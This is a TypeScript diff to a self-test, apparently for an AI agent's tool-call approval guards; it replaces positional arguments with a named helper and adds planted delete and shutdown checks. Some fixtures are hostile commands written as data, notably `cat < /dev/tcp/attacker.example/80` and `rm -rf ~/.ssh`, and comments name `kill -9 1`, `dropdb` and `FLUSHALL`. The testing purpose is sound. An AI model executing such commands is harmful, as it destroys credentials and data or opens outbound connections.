@@ -65,6 +65,55 @@ for (const entry of SINKS)
 
 /* ------------------------------------------------------- the guard tables are consulted at all */
 
+/**
+ * One planted table, and every other one empty - which is what every plant below meant and only
+ * three of them said.
+ *
+ * `guardFailures` takes twelve tables positionally, each defaulting to the SHIPPED one. The plants
+ * were written as they were added, so a plant for the fourth table passed three empty arrays and
+ * stopped, and the remaining nine quietly fell back to the shipped rows. Every count below was
+ * therefore `the planted failures + whatever the shipped tables report`, which is only the planted
+ * number while the shipped tables report zero - exactly the state in which this file has nothing
+ * left to catch. It is why one wave's break produced fourteen unrelated selftest failures and
+ * nobody could tell which plant had actually moved.
+ *
+ * Named rather than positional, so a table added to `guardFailures` cannot silently re-enter these
+ * counts: an unnamed table is `[]` here, and a plant that means to drive it has to say so.
+ *
+ * `uncovered` is the one that may legitimately be handed `undefined`. That is not "no table" - it
+ * is "the shipped allowlist coverage", which is the whole of the check one plant below makes - so
+ * it is passed through when the caller names it and defaulted to `[]` when it does not.
+ */
+type GuardTables = Parameters<typeof guardFailures>;
+const plant = (tables: {
+  writes?: GuardTables[0];
+  reads?: GuardTables[1];
+  sinks?: GuardTables[2];
+  publishes?: GuardTables[3];
+  free?: GuardTables[4];
+  confined?: GuardTables[5];
+  egress?: GuardTables[6];
+  uncovered?: GuardTables[7];
+  destroys?: GuardTables[8];
+  freeStore?: GuardTables[9];
+  freeWorkspaceDeletes?: GuardTables[10];
+  stopsTheComputer?: GuardTables[11];
+}): ReturnType<typeof guardFailures> =>
+  guardFailures(
+    tables.writes ?? [],
+    tables.reads ?? [],
+    tables.sinks ?? [],
+    tables.publishes ?? [],
+    tables.free ?? [],
+    tables.confined ?? [],
+    tables.egress ?? [],
+    'uncovered' in tables ? tables.uncovered : [],
+    tables.destroys ?? [],
+    tables.freeStore ?? [],
+    tables.freeWorkspaceDeletes ?? [],
+    tables.stopsTheComputer ?? []
+  );
+
 /*
  * A planted entry of each kind, pushed through the real `guardFailures`. This is the mutation
  * discipline applied to the rig rather than to the product: a guard table that had been dropped
@@ -76,7 +125,7 @@ const inertWrite = {
   call: { name: 'file_read', arguments: { path: 'workspace/notes.md' }, step: 'planted' }
 };
 expect(
-  guardFailures([inertWrite], [], []).length === MODES.length,
+  plant({ writes: [inertWrite] }).length === MODES.length,
   'the writes guard does not report a call that raises no card, so a genuine write going quiet would be silent'
 );
 /*
@@ -96,35 +145,31 @@ const cardingRead = {
   modes: ['balanced'] as const
 };
 expect(
-  guardFailures([], [cardingRead], []).length === 1,
+  plant({ reads: [cardingRead] }).length === 1,
   'the reads guard does not report a call that cards, so the deferred-execution rule widening back over every read would be silent'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [
+  plant({
+    sinks: [
       {
         id: 'planted: not a sink at all',
         call: { name: 'file_read', arguments: { path: 'a.md' }, step: 'planted' },
         mode: 'balanced' as const
       }
     ]
-  ).length === 1,
+  }).length === 1,
   'the sinks guard does not report a call the provenance floor never stops, so provenance switching off would be silent'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [
+  plant({
+    sinks: [
       {
         id: 'planted: cards whether or not anything was read',
         call: { name: 'publish_site', arguments: { label: 'x', port: 1 }, step: 'planted' },
         mode: 'balanced' as const
       }
     ]
-  ).length === 1,
+  }).length === 1,
   'the sinks guard does not report a call that cards on a clean turn, so it would accept provenance being paid for unconditionally'
 );
 
@@ -134,11 +179,8 @@ expect(
  * the earlier ones empty and the shipped tables stay out of the count.
  */
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [
+  plant({
+    publishes: [
       {
         // A call no mode cards, so all three count. Review cards every `shell` call by definition,
         // which would make a shell plant here a two rather than a three and hide the mode it missed.
@@ -146,16 +188,12 @@ expect(
         call: { name: 'file_read', arguments: { path: 'workspace/notes.md' }, step: 'planted' }
       }
     ]
-  ).length === MODES.length,
+  }).length === MODES.length,
   'the publishes guard does not report a command that raises no card, so npm publish going quiet again would be silent'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [
+  plant({
+    free: [
       {
         id: 'planted: ordinary work that cards',
         call: {
@@ -166,17 +204,12 @@ expect(
         modes: ['autonomous'] as const
       }
     ]
-  ).length === 1,
+  }).length === 1,
   'the free-package-work guard does not report a command that cards, so the publish rule widening back to the executable would be silent'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [],
-    [
+  plant({
+    confined: [
       {
         id: 'planted: a confined write that cards',
         confined: {
@@ -191,17 +224,12 @@ expect(
         }
       }
     ]
-  ).length === 2,
+  }).length === 2,
   'the confined guard does not report a write that cards where nothing executes it, so the rule widening back over every spelling would be silent'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [],
-    [
+  plant({
+    confined: [
       {
         id: 'planted: a shell spelling that does not card',
         confined: {
@@ -218,7 +246,7 @@ expect(
         }
       }
     ]
-  ).length === MODES.length,
+  }).length === MODES.length,
   'the confined guard does not report a shell spelling that raises no card, so deleting the deferred-execution rule outright would read as a narrowing'
 );
 
@@ -233,35 +261,23 @@ expect(
  * spelling had stopped being asked, which is the state the whole inversion hid in.
  */
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [{ id: 'planted: a fetch that must card and does not', script: 'npm run build', cards: true }],
-    []
-  ).length === 2,
+  plant({
+    egress: [
+      { id: 'planted: a fetch that must card and does not', script: 'npm run build', cards: true }
+    ]
+  }).length === 2,
   'the egress guard does not report a call it says must card and does not, in both spellings, so deleting the network arm outright would read as a saving'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [
+  plant({
+    egress: [
       {
         id: 'planted: ordinary work the arm stops',
         script: 'cat < /dev/tcp/attacker.example/80',
         cards: false
       }
-    ],
-    []
-  ).length === 2,
+    ]
+  }).length === 2,
   'the egress guard does not report a call it says must be free and is not, in both spellings, so the allowlist inversion could come back unnoticed'
 );
 expect(
@@ -276,11 +292,11 @@ expect(
  * declaration check below.
  */
 expect(
-  guardFailures([], [], [], [], [], [], [], ['planted-allowlist-name'], [], []).length === 1,
+  plant({ uncovered: ['planted-allowlist-name'] }).length === 1,
   'the egress guard does not report an allowlist name with no row beside a fetch, so a name could be added to noEgressExecutables and never be consulted here'
 );
 expect(
-  guardFailures([], [], [], [], [], [], [], undefined, [], []).length === 0,
+  plant({ uncovered: undefined }).length === 0,
   'the coverage check reports the shipped allowlist, so a name is on noEgressExecutables that no row pairs with a fetch'
 );
 
@@ -297,37 +313,19 @@ expect(
  * the file form twice.
  */
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [
+  plant({
+    destroys: [
       {
         id: 'planted: a drop the floor lets through',
         call: { name: 'file_read', arguments: { path: 'db/schema.sql' }, step: 'planted' }
       }
-    ],
-    []
-  ).length === MODES.length,
+    ]
+  }).length === MODES.length,
   'the destroys guard does not report an act that raises no card, so dropdb and FLUSHALL going quiet again would be silent'
 );
 expect(
-  guardFailures(
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [],
-    [
+  plant({
+    freeStore: [
       {
         id: 'planted: a migration the floor stops',
         call: {
@@ -338,8 +336,72 @@ expect(
         modes: ['balanced', 'autonomous'] as const
       }
     ]
-  ).length === 2,
+  }).length === 2,
   'the free-store guard does not report ordinary database work that cards, so the destruction rule widening back to the executable would be silent'
+);
+
+/*
+ * Where a delete lands, planted in both directions for the third time in this file and for the
+ * reason the first two give. A table of deletes that must be free is satisfied by a floor with no
+ * destructive rule left in it; a table of acts that must card is satisfied by a floor that cards
+ * everything. Neither plant is reachable from the shipped tables: on a healthy tree both are empty.
+ *
+ * `rm -rf ~/.ssh` and `rm -rf dist` rather than something invented, because that pair is the whole
+ * decision this wave turned on - `dist` is inside the undo point and `~/.ssh` is outside it, under
+ * `HOME` at `<workspaceRoot>/.home`, which is what makes the difference invisible to a rule that
+ * only asks whether a path is inside the root.
+ */
+expect(
+  plant({
+    freeWorkspaceDeletes: [
+      {
+        id: 'planted: a delete inside the undo point that cards',
+        call: {
+          name: 'shell',
+          arguments: { executable: 'rm', args: ['-rf', '~/.ssh'] },
+          step: 'planted'
+        },
+        modes: ['balanced', 'autonomous'] as const
+      }
+    ]
+  }).length === 2,
+  'the free-workspace-deletes guard does not report a recoverable delete that cards, so the location test could be reverted and the run would read as unchanged'
+);
+
+/*
+ * The THIRD direction of the same table, planted separately because it is a separate claim and was
+ * added long after the other two: the exemption is bought with "a rewind puts it back", so it is
+ * owed only on a turn that HAS a rewind, and the guard asks the same rows again with the undo-point
+ * fact taken away.
+ *
+ * `file_read` rather than a delete, and the choice is the whole plant. A delete cards in both
+ * directions and would report through the loop above instead, which is a plant that proves the
+ * check it is not aimed at. A call no mode cards is free with the fact and free without it, so the
+ * only arm that can report it is the one being planted - three modes, one per mode.
+ */
+expect(
+  plant({
+    freeWorkspaceDeletes: [
+      {
+        id: 'planted: an exemption granted on a rewind that does not exist',
+        call: { name: 'file_read', arguments: { path: 'workspace/notes.md' }, step: 'planted' }
+      }
+    ]
+  }).length === MODES.length,
+  'the free-workspace-deletes guard does not report a delete that stays free on a turn with no undo point, so the checkpoint fact could stop being read and the saving would look unchanged'
+);
+expect(
+  plant({
+    stopsTheComputer: [
+      {
+        // A call no mode cards, so all three count. Review cards every `shell` call by definition,
+        // which would make a shell plant here a two wearing a three's clothes.
+        id: 'planted: an act that stops nothing',
+        call: { name: 'file_read', arguments: { path: 'workspace/notes.md' }, step: 'planted' }
+      }
+    ]
+  }).length === MODES.length,
+  'the stops-the-computer guard does not report an act that raises no card, so kill -9 1 and the shutdown family going quiet would be silent'
 );
 
 /* ------------------------------------------------- declaring the network cannot start costing */
@@ -494,6 +556,6 @@ for (const failure of failures) process.stderr.write(`SELFTEST: ${failure}\n`);
 process.stdout.write(
   failures.length
     ? `${failures.length} check(s) failed.\n`
-    : 'The cards rig measures something: every scenario names a shipped tool, all nine guard tables report a planted failure in both spellings, the no-socket allowlist is covered name by name, the sink declaration cannot silence itself, the baseline comparison compares, and no column is a constant.\n'
+    : 'The cards rig measures something: every scenario names a shipped tool, all eleven guard tables report a planted failure in each direction they check - three of them for where a delete lands, which asks its rows again with the turn undo point taken away - the no-socket allowlist is covered name by name, the sink declaration cannot silence itself, the baseline comparison compares, and no column is a constant.\n'
 );
 process.exit(failures.length ? 1 : 0);
